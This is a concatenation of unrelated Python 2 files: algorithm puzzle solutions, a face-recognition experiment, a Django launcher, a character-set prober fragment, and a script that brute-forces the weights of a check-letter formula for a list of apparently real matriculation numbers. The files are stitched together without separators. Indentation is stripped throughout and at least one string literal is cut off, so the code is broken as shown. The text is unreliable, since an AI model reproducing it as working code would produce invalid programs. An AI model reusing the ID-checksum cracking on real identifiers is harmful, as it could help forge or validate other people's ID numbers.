return maxa
if __name__=="__main__":
assert Solution().lengthOfLongestSubstringKDistinct("eceba", 3)==4
class Solution:
def lengthOfLongestSubstring(self, s):
b = 0
e = 0
n = len(s)
maxa = 0
st = set()
while e < n:
while s[e] in st:
st.remove(s[b])
b += 1
st.add(s[e])
e += 1
maxa = max(maxa, e-b)
return maxa
if __name__ == "__main__":
assert Solution().lengthOfLongestSubstring("abcabcbb") == 3
class Solution:
def longestWords(self, dictionary):
ret = []
for word in dictionary:
if not ret or len(word) > len(ret[0]):
ret = [word]
elif len(word) == len(ret[0]):
ret.append(word)
return ret
class TreeNode:
def __init__(self, val):
self.val = val
self.left, self.right = None, None
def __repr__(self):
return repr(self.val)
class Solution:
def lowestCommonAncestor(self, root, A, B):
p1 = self.path(root, A)
p2 = self.path(root, B)
p1.append(TreeNode(0))
p2.append(TreeNode(0))
for ind, val in enumerate(p1):
if val != p2[ind]:
return p1[ind-1]
def path(self, root, target):
ans = []
self.get_path(root, target, [], ans)
return ans
def get_path(self, cur, target, path, ans):
if not cur:
return False
path.append(cur)
if cur == target:
ans.extend(path)
return True
if cur.left and self.get_path(cur.left, target, path, ans):
return True
if cur.right and self.get_path(cur.right, target, path, ans):
return True
path.pop()
return False
if __name__ == "__main__":
node = TreeNode(1)
print Solution().lowestCommonAncestor(node, node, node)
nodes = dict(zip(range(3, 8), [TreeNode(i) for i in range(3, 8)]))
nodes[4].left = nodes[3]
nodes[4].right = nodes[7]
nodes[7].left = nodes[5]
nodes[7].right = nodes[6]
print Solution().lowestCommonAncestor(nodes[4], nodes[3], nodes[5])
import numpy as np
from scipy import ndimage
import os
import sys
sys.path.append("../..")
try:
from PIL import Image
except ImportError:
import Image
import matplotlib.pyplot as plt
import textwrap
import logging
from facerec.feature import SpatialHistogram
from facerec.distance import ChiSquareDistance
from facerec.classifier import NearestNeighbor
from facerec.model import PredictableModel
from facerec.lbp import LPQ, ExtendedLBP
from facerec.validation import SimpleValidation, precision
from facerec.util import shuffle_array
EXPERIMENT_NAME = "LocalPhaseQuantizationExperiment"
ITER_MAX = 1
class FileNameFilter:
def __init__(self, name):
self._name = name
def __call__(self, filename):
return True
def __repr__(self):
return "FileNameFilter (name=%s)" % (self._name)
class YaleBaseFilter(FileNameFilter):
def __init__(self, min_azimuth, max_azimuth, min_elevation, max_elevation):
FileNameFilter.__init__(self, "Filter YaleFDB Subset1")
self._min_azimuth = min_azimuth
self._max_azimuth = max_azimuth
self._min_elevation = min_elevation
self._max_elevation = max_elevation
def __call__(self, filename):
filetype = filename[-4:]
if filetype != ".pgm":
return False
if "Ambient" in filename:
return False
azimuth = abs(int(filename[12:16]))
elevation = abs(int(filename[17:20]))
if azimuth < self._min_azimuth or azimuth > self._max_azimuth:
return False
if elevation < self._min_elevation or elevation > self._max_elevation:
return False
return True
def __repr__(self):
return "Yale FDB Filter (min_azimuth=%s, max_azimuth=%s, min_elevation=%s, max_elevation=%s)" % (min_azimuth, max_azimuth, min_elevation, max_elevation)
def read_images(path, fileNameFilter=FileNameFilter("None"), sz=None):
c = 0
X,y = [], []
for dirname, dirnames, filenames in os.walk(path):
for subdirname in dirnames:
subject_path = os.path.join(dirname, subdirname)
for filename in os.listdir(subject_path):
if fileNameFilter(filename):
try:
im = Image.open(os.path.join(subject_path, filename))
im = im.convert("L")
if (sz is not None):
im = im.resize(sz, Image.ANTIALIAS)
X.append(np.asarray(im, dtype=np.uint8))
y.append(c)
except IOError, (errno, strerror):
print "I/O error({0}): {1}".format(errno, strerror)
except:
print "Unexpected error:", sys.exc_info()[0]
raise
c = c+1
return [X,y]
def apply_gaussian(X, sigma):
return np.array([ndimage.gaussian_filter(x, sigma) for x in X])
def results_to_list(validation_results):
return [precision(result.true_positives,result.false_positives) for result in validation_results]
def partition_data(X, y):
Xs,ys = shuffle_array(X,y)
mapping = {}
for i in xrange(len(y)):
yi = ys[i]
try:
mapping[yi].append(i)
except KeyError:
mapping[yi] = [i]
Xtrain, ytrain = [], []
Xtest, ytest = [], []
for key, indices in mapping.iteritems():
Xtrain.extend([ Xs[i] for i in indices[:1] ])
ytrain.extend([ ys[i] for i in indices[:1] ])
Xtest.extend([ Xs[i] for i in indices[1:20]])
ytest.extend([ ys[i] for i in indices[1:20]])
return Xtrain, ytrain, Xtest, ytest
class ModelWrapper:
def __init__(model):
self.model = model
self.result = []
if __name__ == "__main__":
out_dir = None
if len(sys.argv) < 2:
print "USAGE: lpq_experiment.py </path/to/images>"
sys.exit()
yale_subset_0_40 = YaleBaseFilter(0, 40, 0, 40)
[X,y] = read_images(sys.argv[1], yale_subset_0_40, sz=(64,64))
handler = logging.StreamHandler(sys.stdout)
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
handler.setFormatter(formatter)
logger = logging.getLogger("facerec")
logger.addHandler(handler)
logger.setLevel(logging.INFO)
model0 = PredictableModel(feature=SpatialHistogram(lbp_operator=ExtendedLBP()), classifier=NearestNeighbor(dist_metric=ChiSquareDistance(), k=1))
model1 = PredictableModel(feature=SpatialHistogram(lbp_operator=LPQ()), classifier=NearestNeighbor(dist_metric=ChiSquareDistance(), k=1))
sigmas = [0]
print 'The experiment will be run %s times!' % ITER_MAX
experiments = {}
experiments['lbp_model'] = { 'model': model0, 'results' : {}, 'color' : 'r', 'linestyle' : '--', 'marker' : '*'}
experiments['lpq_model'] = { 'model': model1, 'results' : {}, 'color' : 'b', 'linestyle' : '--', 'marker' : 's'}
for sigma in sigmas:
print "Setting sigma=%s" % sigma
for key, value in experiments.iteritems():
print 'Running experiment for model=%s' % key
cv0 = SimpleValidation(value['model'])
for iteration in xrange(ITER_MAX):
print "Repeating experiment %s/%s." % (iteration + 1, ITER_MAX)
Xtrain, ytrain, Xtest, ytest = partition_data(X,y)
Xs = apply_gaussian(Xtest, sigma)
experiment_description = "%s (iteration=%s, sigma=%.2f)" % (EXPERIMENT_NAME, iteration, sigma)
cv0.validate(Xtrain, ytrain, Xs, ytest, experiment_description)
true_positives = sum([validation_result.true_positives for validation_result in cv0.validation_results])
false_positives = sum([validation_result.false_positives for validation_result in cv0.validation_results])
prec = precision(true_positives,false_positives)
print key
experiments[key]['results'][sigma] = prec
fig = plt.figure()
plot_legend = []
for experiment_name, experiment_definition in experiments.iteritems():
print key, experiment_definition
results = experiment_definition['results']
(xvalues, yvalues) = zip(*[(k,v) for k,v in results.iteritems()])
plot_legend.append(experiment_name)
plot_color = experiment_definition['color']
plot_linestyle = experiment_definition['linestyle']
plot_marker = experiment_definition['marker']
plt.plot(sigmas, yvalues, linestyle=plot_linestyle, marker=plot_marker, color=plot_color)
plt.legend(plot_legend, prop={'size':6}, numpoints=1, loc='upper center', bbox_to_anchor=(0.5, -0.2),  fancybox=True, shadow=True, ncol=1)
plt.ylim(0,1)
plt.xlim(-0.2, max(sigmas) + 1)
plt.title(EXPERIMENT_NAME)
plt.ylabel('Precision')
plt.xlabel('Sigma')
fig.subplots_adjust(bottom=0.5)
plt.savefig("lpq_experiment.png", bbox_inches='tight',dpi=100)
class Node(object):
def __init__(self, key, val):
self.key = key
self.val = val
self.pre, self.next = None, None
class LRUCache(object):
def __init__(self, capacity):
self.cap = capacity
self.map = {}
self.head = None
self.tail = None
def get(self, key):
if key in self.map:
cur = self.map[key]
self._elevate(cur)
return cur.val
return -1
def set(self, key, value):
if key in self.map:
cur = self.map[key]
cur.val = value
self._elevate(cur)
else:
cur = Node(key, value)
self.map[key] = cur
self._appendleft(cur)
if len(self.map) > self.cap:
last = self._pop()
del self.map[last.key]
def _appendleft(self, cur):
if not self.head and not self.tail:
self.head = cur
self.tail = cur
return
head = self.head
cur.next, cur.pre, head.pre = head, None, cur
self.head = cur
def _pop(self):
last = self.tail
if self.head == self.tail:
self.head, self.tail = None, None
return last
pre = last.pre
pre.next = None
self.tail = pre
return last
def _elevate(self, cur):
pre, nxt = cur.pre, cur.next
if not pre:
return
elif not nxt:
assert self.tail == cur
self._pop()
else:
pre.next, nxt.pre = nxt, pre
self._appendleft(cur)
from Join_Ftr import *
from ReadFile import ReadFile
from GS_Face import GsFace
feature_pth = 'E:\\GPforFR\\data\\lfw_feature5'
instruc_pth_t = 'E:\\GPforFR\\data\\lfw_view1\\pairsDevTrain.txt'
instruc_pth_s = 'E:\\GPforFR\\data\\lfw_view1\\pairsDevTest.txt'
num = 5
read_file = ReadFile(instruc_pth_t, num)
X1 = read_file.person_pair() + read_file.person_mispair()
read_file = ReadFile(instruc_pth_s, num)
X2 = read_file.person_pair() + read_file.person_mispair()
gs_feature = Join_Ftr()
Xtar, Ytar = gs_feature.Constrct_XY(feature_pth, X1)
Xsrc, Ysrc = gs_feature.Constrct_XY(feature_pth, X2)
Xt_in, Yt_in = gs_feature.XY_in(Xtar, Ytar)
Xs_in, Ys_in = gs_feature.XY_in(Xsrc, Ysrc)
gsface = GsFace(Xt_in, Xs_in)
class Solution:
def solve(self, cipher, lst):
N, K= cipher
N = int(N)
K = int(K)
N = len(lst)
dp = [[1<<32 for _ in xrange(N+1)] for _ in xrange(N+1)]
for i in xrange(N):
dp[i][i] = 1
for j in xrange(i+1, N):
dp[j][i] = 0
dp[i][i+1] = 2
for w in xrange(2, N+1):
for i in xrange(0, N-w):
j = i+w
if lst[j]-lst[i]==2*K:
for p in xrange(i+1, j):
if 2*lst[p]==lst[i]+lst[j] and dp[i+1][p-1]==0 and dp[p+1][j-1]==0:
dp[i][j] = 0
if dp[i][j]!=0:
dp[i][j] = min(dp[i][j], min(dp[i][p]+dp[p+1][j] for p in xrange(i, j)))
return dp[0][N-1]
if __name__=="__main__":
f = open("2.in", "r")
o = open("out.out", "w")
testcases = int(f.readline().strip())
for t in xrange(testcases):
cipher = f.readline().strip().split(' ')
lst = [int(item) for item in f.readline().strip().split(' ')]
s = "Case
print s,
o.write(s)
class Solution:
def majorityNumber(self, nums):
n1, n2 = None, None
cnt1, cnt2 = 0, 0
for num in nums:
if num in (n1, n2):
if num == n1:
cnt1 += 1
else:
cnt2 += 1
else:
if cnt1 == 0:
n1 = num
cnt1 += 1
elif cnt2 == 0:
n2 = num
cnt2 += 1
else:
cnt1 -= 1
cnt2 -= 1
if len(filter(lambda x: x == n1, nums)) > len(nums)/3:
return n1
else:
return n2
if __name__ == "__main__":
assert Solution().majorityNumber(
[169, 43, 133, 93, 60, 29, 60, 104, 26, 60, 38, 52, 60, 118, 45, 183, 49, 42, 60, 0, 66, 67, 194, 127, 60, 60,
60, 60, 60, 60]) == 60
from collections import defaultdict
class Solution(object):
def majorityNumber(self, nums, k):
cnt = defaultdict(int)
for num in nums:
if num in cnt:
cnt[num] += 1
else:
if len(cnt) < k-1:
cnt[num] += 1
else:
for key in cnt.keys():
cnt[key] -= 1
if cnt[key] == 0:
del cnt[key]
for key in cnt.keys():
if len(filter(lambda x: x == key, nums)) > len(nums)/k:
return key
raise Exception
def majorityNumber_array(self, nums, k):
n = [None for _ in xrange(k)]
cnt = [0 for _ in xrange(k)]
for num in nums:
if num not in n:
i = 0
while i < k:
if cnt[i] == 0:
n[i] = num
cnt[i] += 1
break
i += 1
if i < k:
continue
if num not in n:
for i in xrange(k):
assert cnt[i] > 0
cnt[i] -= 1
for i in xrange(k):
if cnt[i] == 0:
n[i] = num
cnt[i] += 1
break
else:
i = n.index(num)
cnt[i] += 1
for i in xrange(k):
if len(filter(lambda x: x == n[i], nums)) > len(nums)/k:
return n[i]
raise Exception
def majorityNumber_error(self, nums, k):
n = [None for _ in xrange(k)]
cnt = [0 for _ in xrange(k)]
for num in nums:
if num not in n:
for i in xrange(k):
if cnt[i] == 0:
n[i] = num
cnt[i] += 1
break
if num not in n:
for i in xrange(k):
assert cnt[i] > 0
cnt[i] -= 1
for i in xrange(k):
if cnt[i] == 0:
n[i] = num
cnt[i] += 1
break
else:
i = n.index(num)
cnt[i] += 1
for i in xrange(k):
if len(filter(lambda x: x == n[i], nums)) > len(nums)/k:
return n[i]
raise Exception
if __name__ == "__main__":
assert Solution().majorityNumber(
[32, 125, 176, 234, 170, 147, 151, 243, 67, 62, 20, 149, 191, 129, 131, 107, 126, 50, 194, 63, 191, 191, 13,
139, 191, 164, 239, 119, 234, 79, 51, 160, 194, 140, 191, 165, 80, 191, 26, 26, 191, 26, 16, 252, 196, 12, 191,
191, 249, 52, 161, 169, 94, 140, 250, 75, 110, 143, 57, 255, 90, 143, 191, 71, 16, 22, 50, 252, 191, 138, 191,
142, 221, 104, 182, 57, 47, 191, 179, 63, 191, 68, 91, 185, 225, 183, 69, 216, 146, 152, 164, 172, 169, 68,
245, 123, 191, 191, 219, 207, 244, 147, 215, 42, 121, 112, 241, 179, 27, 162, 243, 133, 148, 178, 214, 191,
208, 138, 45, 62, 191, 56, 232, 74, 197, 154, 225, 31, 136, 191, 244, 166, 41, 48, 50, 94, 245, 239, 103, 191,
191, 161, 180, 82, 210, 191, 191, 253, 163, 171, 140, 249, 198, 51, 85, 93, 55, 76, 32, 191, 191, 27, 57, 231,
163, 205, 134, 165, 40, 11, 191, 133, 183, 164, 138, 75, 191, 22, 232, 248, 54, 136, 106, 109, 229, 242, 121,
210, 218, 28, 72, 252, 90, 177, 184, 60, 229, 81, 98, 36, 48, 21, 230, 120, 19, 202, 76, 196, 236, 44, 162, 94,
89, 151, 72, 191, 242, 187, 218, 228, 62, 169, 62, 187, 162, 232, 24, 236, 164, 28, 63, 117, 212, 191, 206, 15,
209, 85, 37, 177, 23, 250, 30, 126, 246, 48, 115, 96, 198, 106, 198, 139, 19, 118, 153], 9) == 191
class Solution:
def majorityNumber(self, nums):
cnt = 0
maj = 0
for ind, num in enumerate(nums):
if num == nums[maj]:
cnt += 1
else:
cnt -= 1
if cnt < 0:
maj = ind
cnt = 1
return nums[maj]
if __name__ == "__main__":
assert Solution().majorityNumber([1, 1, 1, 2, 2, 2, 2, 1, 1]) == 1
class Solution(object):
def solve_MLE(self, cipher):
a, b = cipher
a, b = list(a), list(b)
m = len(a)
n = len(b)
a.sort()
b.sort()
dp = [[0 for _ in xrange(n + 1)] for _ in xrange(m + 1)]
for i in xrange(m + 1):
dp[i][0] = i
for j in xrange(n + 1):
dp[0][j] = j
for i in xrange(1, m + 1):
for j in xrange(1, n + 1):
if a[i - 1] == b[j - 1]:
dp[i][j] = dp[i - 1][j - 1]
else:
dp[i][j] = min(dp[i - 1][j], dp[i][j - 1]) + 1
return dp[-1][-1]
def solve(self, cipher):
a, b = cipher
bucket = [0 for _ in xrange(26)]
for char in a:
bucket[ord(char) - ord('a')] += 1
for char in b:
bucket[ord(char) - ord('a')] -= 1
counter = 0
for ind, val in enumerate(bucket):
counter += abs(val - 0)
return counter
if __name__ == "__main__":
import sys
f = open("1.in", "r")
cipher = []
cipher.append(f.readline().strip())
cipher.append(f.readline().strip())
s = "%s\n" % (Solution().solve(cipher))
print s,
from sys import stdin, stdout
from re import compile as _compile
from codecs import open as _open
MALT_REGEX = _compile(ur'^(?P<token>.*?)\t(?P<pos>[^\t]+)\t'
ur'(?P<head>[^\t]+)\t(?P<rel>[^\t]+)$')
OUTPUT_LINE = u'{token_num}\t{token}\t_\t{pos}\t{pos}\t_\t{head}\t{rel}\t_\t_'
def main(args):
token_cnt = 0
for line in (l.decode('utf-8').rstrip('\n') for l in stdin):
if not line:
token_cnt = 0
stdout.write('\n')
continue
else:
token_cnt += 1
m = MALT_REGEX.match(line)
assert m is not None, 'parse error (sorry...)'
g_dic = m.groupdict()
output = OUTPUT_LINE.format(
token_num=token_cnt,
token=g_dic['token'],
pos=g_dic['pos'],
head=g_dic['head'],
rel=g_dic['rel']
)
stdout.write(output.encode('utf-8'))
stdout.write('\n')
if __name__ == '__main__':
from sys import argv
exit(main(argv))
import os
import sys
if __name__ == "__main__":
os.environ.setdefault("DJANGO_SETTINGS_MODULE", "tagr.settings")
from django.core.management import execute_from_command_line
execute_from_command_line(sys.argv)
class Solution(object):
def __init__(self):
import math
MAX_MULT = int(math.log(10 ** 16) / math.log(5)) + 1
self.M = [(i, (5 ** i - 1) / 4) for i in reversed(xrange(1, MAX_MULT + 1))]
def solve_TLE(self, cipher):
cnt = 0
m = 0
while True:
if cnt >= cipher:
break
else:
m2 = m
while m2 != 0 and m2 % 5 == 0:
cnt += 1
m2 /= 5
m += 5
m -= 5
return m
def solve_math(self, cipher):
n = cipher
m = 0
for i, p in self.M:
if p <= n:
cnt = n / p
n -= cnt * p
m += cnt * 5 ** i
return m
def solve(self, n):
l = 0
h = 5 * n
while l <= h:
mid = (l + h) / 2
cnt = self.prime_count(5, mid)
if cnt < n:
l = mid + 1
else:
h = mid - 1
return l
def prime_count(self, p, n):
if n < p:
return 0
return n / p + self.prime_count(p, n / p)
if __name__ == "__main__":
import sys
f = open("1.in", "r")
testcases = int(f.readline().strip())
solution = Solution()
for t in xrange(testcases):
cipher = int(f.readline().strip())
s = "%s\n" % (solution.solve(cipher))
print s,
class Solution(object):
def solve(self, cipher):
l = len(cipher)
if l == 1:
if int(cipher) % 8 == 0:
return "YES"
else:
return "NO"
elif l == 2:
if int(cipher) % 8 == 0 or int(cipher[::-1]) % 8 == 0:
return "YES"
else:
return "NO"
hm = [0 for _ in xrange(10)]
for char in cipher:
hm[int(char)] += 1
for i in xrange(0, 1000, 8):
copy = list(hm)
s = "00" + str(i)
j = -1
while j >= -3:
d = int(s[j])
if copy[d] <= 0: break
copy[d] -= 1
j -= 1
if j == -4:
return "YES"
return "NO"
if __name__ == "__main__":
import sys
f = open("1.in", "r")
testcases = int(f.readline().strip())
for t in xrange(testcases):
cipher = f.readline().strip()
s = "%s\n" % (Solution().solve(cipher))
print s,
class Solution(object):
def solve(self, cipher):
n, K, A = cipher
A.sort()
cnt = 0
for elt in A:
K -= elt
if K >= 0:
cnt += 1
else:
break
return cnt
if __name__ == "__main__":
import sys
f = open("0.in", "r")
solution = Solution()
n, K = map(int, f.readline().strip().split(' '))
A = map(int, f.readline().strip().split(' '))
cipher = n, K, A
s = "%s\n" % (solution.solve(cipher))
print s,
from matric_hash import *
validate_set = {
"1022751": "d",
"1240101": "g",
"1020305": "k",
"1021230": "j",
"1122857": "f",
"1320141": "j",
"1320184": "c",
"1320579": "j",
"1322965": "d",
"1322790": "j",
"1021388": "k",
"1321467": "g",
"1321829": "f",
"1322455": "g",
"1320195": "j",
"1320544": "h",
"1320905": "k",
"1323047": "j",
"1322929": "l",
"1321324": "l",
"1320914": "l",
"1321259": "k",
"1020592": "e",
"1322989": "k",
"1322920": "e",
"1321445": "f",
"1240045": "g",
"1321427": "d",
"1320576": "g",
"1320670": "e",
"1122762": "f",
"1320551": "d",
"1321647": "d",
"1310836": "f",
"1310924": "e",
"1221043": "h",
"1322169": "j",
"1122884": "j",
"1020285": "c",
"1120840": "a",
"1220441": "h",
"1320782": "k",
"1322294": "j",
"1220827": "b",
"1222309": "g",
"1322968": "f",
"1321638": "c",
"1321154": "a",
"1330863": "f",
"1320940": "f",
"1322652": "j",
"1320793": "e",
"1320793": "e",
"1320646": "d",
"1100187": "b",
"1320619": "a",
"1020768": "h",
"1320560": "e",
"1123165": "k",
"1020145": "j",
"1020597": "a",
"1320087": "c",
"1320187": "e",
"1320605": "d",
"1220816": "g",
"1322402": "d",
"1220504": "j",
"1020131": "a",
"1121329": "d",
"1122983": "c",
"1220768": "l",
"1322950": "k",
"1122995": "f",
"1120129": "h",
"1231062": "l",
"1121587": "b",
"1122036": "h",
"1220521": "c",
"1321622": "a",
"1322766": "h",
"1022785": "h",
"1040013": "e",
"1022986": "j",
"1240289": "b",
"1120733": "c",
"1220811": "l",
"1320561": "b",
"1122859": "l",
"1221127": "b",
"1020121": "c",
"1323045": "d",
"1221881": "l",
"1221128": "k",
"1220062": "d",
"1020768": "h",
"1320560": "e",
"1321808": "b",
"1321978": "a",
"1322402": "d",
"1321465": "e",
"1120733": "c",
"1122643": "e",
"1310088": "g",
"1210269": "e",
"1122741": "b",
"1110005": "g",
}
weight = [10, 7, 4, 3, 2, 9, 8]
offset = 0
def validate():
for key, item in validate_set.items():
temp = map(lambda x: int(x), " ".join(key).split(" "))
check_sum = calculate_check_sum(temp, weight)
if candiates_sum[(check_sum+offset)%11]==item:
print key
else:
print "Wrong: ",key
def guess():
numbers = [
"1220504",
]
print "Guessing..."
for number in numbers:
temp = map(lambda x: int(x), " ".join(number).split(" "))
check_sum = calculate_check_sum(temp, weight)
print candiates_sum[(check_sum+offset)%11]
if __name__=="__main__":
validate()
guess()
from multiprocessing import Process
BASE = 11
NUM_PS = BASE
ERROR_THRESHOLD = 0.2
LENGTH = 7
MAX = BASE**LENGTH
candiates_sum = {
0: "a",
1: "b",
2: "c",
3: "d",
4: "e",
5: "f",
6: "g",
7: "h",
8: "j",
9: "k",
10: "l"
}
training_set = {
"1122936": "d",
"1122965": "a",
"1122983": "c",
"1122763": "c",
"1122887": "l",
"1110284": "j",
"1110658": "l",
"1220787": "k",
"1021352": "a",
"1020216": "c",
"1010118": "b",
}
def calculate_check_sum(lst, weight):
sum = 0
assert len(lst)==len(weight)
for i in xrange(len(lst)):
sum += lst[i]*weight[i]
return sum
class Worker(Process):
def __init__(self, lower, upper):
super(Worker, self).__init__()
self.lower = lower
self.upper = upper
def run(self):
for offset in range(1):
for i in xrange(self.lower, self.upper):
weight = []
for j in xrange(LENGTH):
weight.append(i%(BASE))
i /= BASE
weight.reverse()
error = 0
for key, item in training_set.items():
temp = map(lambda x: int(x), " ".join(key).split(" "))
check_sum = calculate_check_sum(temp, weight)
if not candiates_sum[(check_sum+offset)%11]==item:
error+=1
error_rate = float(error)/len(training_set)
if error_rate>=ERROR_THRESHOLD:
continue
else:
result = "offset: %d, %s, error_rate: %f"%(offset, str(weight), error_rate)
print result
if __name__ == "__main__":
workers = {}
for i in xrange(NUM_PS):
workers[i] = Worker(i*MAX/NUM_PS, (i+1)*MAX/NUM_PS)
workers[i].start()
for i in xrange(NUM_PS):
workers[i].join()
class Solution:
def printZMatrix(self, matrix):
i = 0
j = 0
m = len(matrix)
n = len(matrix[0])
ret = []
up = True
for _ in xrange(m*n):
ret.append(matrix[i][j])
if up:
if i-1<0 or j+1>=n:
up = False
if j+1>=n:
i += 1
else:
j += 1
else:
i -= 1
j += 1
else:
if i+1>=m or j-1<0:
up = True
if i+1>=m:
j += 1
else:
i += 1
else:
i += 1
j -= 1
return ret
if __name__=="__main__":
matrix = [
[1, 2, 3, 4],
[5, 6, 7, 8],
[9, 10, 11, 12]
]
print Solution().printZMatrix(matrix)
import numpy as np
import numpy.linalg as la
def transpose(A):
A.transpose()
return A.T
def inverse(A):
return la.inv(A)
def to2D(A):
return A[np.newaxis]
def to1D(A):
return A.ravel()
def unroll(A):
return A.reshape(1, -1)
class TreeNode(object):
def __init__(self, val):
self.val = val
self.left, self.right = None, None
class Solution(object):
def maxTree(self, A):
stk = []
for a in A:
cur = TreeNode(a)
while stk and stk[-1].val <= cur.val:
pre = stk.pop()
pre.right = cur.left
cur.left = pre
stk.append(cur)
pre = None
while stk:
cur = stk.pop()
cur.right = pre
pre = cur
return pre
class Solution:
def maxSquare(self, matrix):
M = len(matrix)
N = len(matrix[0])
F = [[0 for _ in xrange(N+1)] for _ in xrange(M+1)]
gmax = 0
for i in xrange(1, M+1):
for j in xrange(1, N+1):
if matrix[i-1][j-1] == 1:
F[i][j] = min(F[i-1][j], F[i][j-1], F[i-1][j-1])+1
gmax = max(gmax, F[i][j])
return gmax*gmax
def maxSquare_error(self, matrix):
M = len(matrix)
N = len(matrix[0])
h = [[0 for _ in xrange(N+1)] for _ in xrange(M+1)]
for i in xrange(1, M+1):
for j in xrange(1, N+1):
if matrix[i-1][j-1] == 1:
h[i][j] = h[i-1][j]+1
else:
h[i][j] = 0
ret = 0
for i in xrange(M):
stk = []
for j in xrange(N):
while stk and h[i+1][stk[-1]+1] >= h[i+1][j+1]:
stk.pop()
idx = -1
if stk: idx = stk[-1]
cur_square = min(j-idx, h[i+1][j+1])
cur_square *= cur_square
ret = max(ret, cur_square)
stk.append(j)
return ret
if __name__ == "__main__":
assert Solution().maxSquare([[0,1,0,1,1,0],[1,0,1,0,1,1],[1,1,1,1,1,0],[1,1,1,1,1,1],[0,0,1,1,1,0],[1,1,1,0,1,1]]
) == 9
import bisect
class Solution(object):
def solve(self, cipher):
N, M, A = cipher
F = []
s = 0
maxa = 0
for a in A:
s += a
s %= M
idx = bisect.bisect_left(F, s)
F.insert(idx, s)
idx = min(bisect.bisect_right(F, (s+1)%M), len(F)-1)
maxa = max(maxa, (s-F[idx])%M, (s-F[idx-1])%M, s%M)
return maxa
def solve_brute(self, cipher):
N, M, A = cipher
F = [0]
s = 0
for a in A:
s = (s+a) % M
F.append(s)
maxa = 0
for i in xrange(1, len(A)+1):
for j in xrange(i):
maxa = max(maxa, F[i], (F[i]-F[j])%M)
return maxa
if __name__ == "__main__":
import sys
f = open("0.in", "r")
solution = Solution()
testcases = int(f.readline().strip())
for t in xrange(testcases):
N, M = map(int, f.readline().strip().split(' '))
A = map(int, f.readline().strip().split(' '))
cipher = N, M, A
s = "%s\n" % (solution.solve(cipher))
print s,
class Solution(object):
def solve(self, cipher):
global_max = -1
A, B = cipher
for i in xrange(A, B + 1):
for j in xrange(i + 1, B + 1):
global_max = max(global_max, i ^ j)
return global_max
if __name__ == "__main__":
import sys
f = sys.stdin
A = int(f.readline().strip())
B = int(f.readline().strip())
cipher = (A, B)
s = "%s\n" % (Solution().solve(cipher))
print s,
import sys
class Solution:
def maximumGap(self, nums):
n = len(nums)
if n < 2:
return 0
gmax = max(nums)
gmin = min(nums)
bin_width = max(1, (gmax-gmin)/(n-1))
bins_max = {}
bins_min = {}
for elt in nums:
bin_num = (elt-gmin)/bin_width
bins_min[bin_num] = min(bins_min.get(bin_num, sys.maxint), elt)
bins_max[bin_num] = max(bins_max.get(bin_num, -sys.maxint-1), elt)
max_gap = -1
pre_bin_max = gmin
for i in xrange((gmax-gmin)/bin_width+1):
if i in bins_min:
max_gap = max(max_gap, bins_min[i]-pre_bin_max)
pre_bin_max = bins_max[i]
return max_gap
if __name__ == "__main__":
assert Solution().maximumGap([1, 9, 2, 5]) == 4
class Solution(object):
def maxProduct(self, nums):
if not nums:
return 0
n = len(nums)
smallest = list(nums)
largest = list(nums)
maxa = nums[0]
for i in xrange(1, n):
v = nums[i]
smallest[i] = min(v, smallest[i-1]*v, largest[i-1]*v)
largest[i] = max(v, smallest[i-1]*v, largest[i-1]*v)
maxa = max(maxa, largest[i])
return maxa
if __name__ == "__main__":
assert Solution().maxProduct([2, 3, -2, 4]) == 6
class Solution:
def maxDiffSubArrays(self, nums):
n = len(nums)
min_left = list(nums)
max_left = list(nums)
min_right = list(nums)
max_right = list(nums)
current = 0
for i in xrange(n):
current += nums[i]
if i-1 >= 0:
min_left[i] = min(current, min_left[i-1], min_left[i])
else:
min_left[i] = min(current, min_left[i])
if current > 0:
current = 0
current = 0
for i in xrange(n):
current += nums[i]
if i-1 >= 0:
max_left[i] = max(current, max_left[i-1], max_left[i])
else:
max_left[i] = max(current, max_left[i])
if current < 0:
current = 0
current = 0
for i in xrange(n-1, -1, -1):
current += nums[i]
if i+1 <= n-1:
max_right[i] = max(current, max_right[i+1], max_right[i])
else:
max_right[i] = max(current, max_right[i])
if current < 0:
current = 0
current = 0
for i in xrange(n-1, -1, -1):
current += nums[i]
if i+1 <= n-1:
min_right[i] = min(current, min_right[i+1], min_right[i])
else:
min_right[i] = min(current, min_right[i])
if current > 0:
current = 0
maxa = 0
for i in xrange(n-1):
maxa = max(maxa, abs(max_left[i]-min_right[i+1]), abs(min_left[i]-max_right[i+1]))
return maxa
if __name__ == "__main__":
print Solution().maxDiffSubArrays([-4, 5, -4, 5, -4, 5, -4, 5, -4, 5, -4, 5, -4, 5, -4, 5, -4, 5, -1000])
class Solution:
def maxTwoSubArrays(self, nums):
n = len(nums)
f = [[-1<<31 for _ in xrange(n+1)] for _ in xrange(2)]
cur = 0
for i in xrange(1, n+1):
cur += nums[i-1]
f[0][i] = max(nums[i-1], f[0][i-1], cur)
if cur < 0:
cur = 0
cur = 0
for i in xrange(n-1, -1, -1):
cur += nums[i]
f[1][i] = max(nums[i], f[1][i+1], cur)
if cur < 0:
cur = 0
maxa = -1<<31
for i in xrange(1, n):
maxa = max(maxa, f[0][i]+f[1][i])
return maxa
if __name__ == "__main__":
print Solution().maxTwoSubArrays([1, 3, -1, 2, -1, 2])
class Solution:
def maxKSubArrays(self, nums, k):
n = len(nums)
f = [[0 for _ in xrange(k+1)] for _ in xrange(n+1)]
g = [[0 for _ in xrange(k+1)] for _ in xrange(n+1)]
s = [0 for _ in xrange(n+1)]
for i in xrange(1, n+1):
s[i] = s[i-1]+nums[i-1]
for i in xrange(1, n+1):
for st in xrange(1, k+1):
if st == 1:
f[i][st] = max([s[i]-s[j] for j in xrange(i)])
else:
f[i][st] = max([g[j][st-1]+s[i]-s[j] for j in xrange(i)])
g[i][st] = max([f[j][st] for j in xrange(i+1)])
maxa = -1<<31
for i in xrange(1, n+1):
maxa = max(maxa, g[i][k])
return maxa
if __name__ == "__main__":
print Solution().maxKSubArrays([1, 2, 3], 1)
print Solution().maxKSubArrays([-1, -2, -3, -100, -1, -50], 2)
import sys
from . import constants
from .charsetprober import CharSetProber
class MultiByteCharSetProber(CharSetProber):
def __init__(self):
CharSetProber.__init__(self)
self._mDistributionAnalyzer = None
self._mCodingSM = None
self._mLastChar = [0, 0]
def reset(self):
CharSetProber.reset(self)
if self._mCodingSM:
self._mCodingSM.reset()
if self._mDistributionAnalyzer:
self._mDistributionAnalyzer.reset()
self._mLastChar = [0, 0]
def get_charset_name(self):
pass
def feed(self, aBuf):
aLen = len(aBuf)
for i in range(0, aLen):
codingState = self._mCodingSM.next_state(aBuf[i])
